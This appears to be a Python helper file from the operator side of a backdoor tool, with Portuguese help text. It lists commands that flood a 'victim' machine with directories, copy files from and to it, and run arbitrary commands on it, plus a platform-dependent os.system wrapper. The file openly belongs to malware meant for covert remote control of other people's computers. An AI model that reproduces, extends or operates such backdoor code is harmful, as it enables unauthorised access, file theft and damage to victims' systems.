import platform
from os import system

def AdaptedFromSystem(Windows='', Linux='', Other=''):
    platforma = platform.system()
    if(platforma == 'Windows'): return system(Windows)
    elif(platforma == 'Linux'): return system(Linux)
    else: return system(Other)


def ShowDialogHelp():
    '''
    Mostra todos comandos especiais e sua descrição.
    '''
    try:
        str = '''
                
        ---------------------------------------------
        |               CREDITS                     |
        --------------------------------------------|
        |   developer: El-SpaceX                    |
        |   github: https://github.com/El-SpaceX    |
        ---------------------------------------------


comandos especiais:

    NXT_spamdir - cria uma quantidade determinada de diretorios na maquina da vitima.
    NXT_checkv - checa a versao do backdoor.
    NXT_getfile - envia um arquivo da maquina da vitima para sua maquina.
    NXT_sendfile - envia um arquivo da sua maquina para a maquina da vitima.
    NXT_exit - fecha conexão com a vitima atual.
    cls - limpa o terminal

comandos normais:

    o comando sera enviado a maquina da vitima que o executara, cuidado com comandos sem resposta.
        '''
        print(str)
    except:
        return False
    return True